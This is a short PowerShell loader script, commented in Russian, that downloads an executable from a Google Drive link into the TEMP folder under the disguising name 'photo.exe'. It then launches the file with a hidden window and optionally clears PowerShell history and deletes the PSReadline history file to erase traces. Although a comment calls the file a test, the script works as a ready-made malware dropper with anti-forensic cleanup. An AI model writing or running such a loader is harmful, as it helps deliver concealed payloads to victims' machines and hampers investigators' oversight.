# loader.ps1 — качает и запускает тестовый exe
$url = "https://drive.google.com/uc?export=download&id=1aBcD...твой_ID_тут"  # ← прямая ссылка на твой exe
$path = "$env:TEMP\photo.exe"

# Качаем
(New-Object Net.WebClient).DownloadFile($url, $path)

# Запускаем скрыто
Start-Process -FilePath $path -WindowStyle Hidden

# (по желанию) удаляем следы PowerShell из истории
Clear-History; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
